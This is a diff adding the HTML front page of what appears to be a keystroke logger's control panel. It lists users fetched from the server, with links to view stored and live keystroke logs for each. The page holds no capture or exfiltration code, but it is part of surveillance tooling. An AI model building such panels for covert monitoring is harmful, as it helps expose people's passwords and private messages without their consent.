@@ -1,0 +1,90 @@
+<!-- index.html -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keystroke Logger</title>
+    <style>
+        body {
+            background-color: black;
+            color: green;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .header {
+            color: yellowgreen;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .user-list {
+            list-style-type: none;
+            padding: 0;
+        }
+        .user-item {
+            margin-bottom: 10px;
+        }
+        .user-button {
+            margin-right: 10px;
+            padding: 8px 16px;
+            background-color: green;
+            color: black;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Keystroke Logger</h1>
+        </div>
+
+        <h2>Users:</h2>
+        <ul class="user-list" id="user-list"></ul>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const response = await fetch('/users');
+                const data = await response.json();
+
+                if (data.status === "success") {
+                    const userListContainer = document.getElementById('user-list');
+                    data.users.forEach(user => {
+                        const listItem = document.createElement('li');
+                        listItem.classList.add('user-item');
+
+                        const viewLogsButton = document.createElement('a');
+                        viewLogsButton.classList.add('user-button');
+                        viewLogsButton.innerText = `View Logs for ${user}`;
+                        viewLogsButton.href = `/view_logs/${user}`;
+                        listItem.appendChild(viewLogsButton);
+
+                        const liveLogsButton = document.createElement('a');
+                        liveLogsButton.classList.add('user-button');
+                        liveLogsButton.innerText = `Live Logs for ${user}`;
+                        liveLogsButton.href = `/live_logs/${user}`;
+                        listItem.appendChild(liveLogsButton);
+
+                        userListContainer.appendChild(listItem);
+                    });
+                } else {
+                    console.error('Failed to fetch users');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
+    </script>
+</body>
+</html>
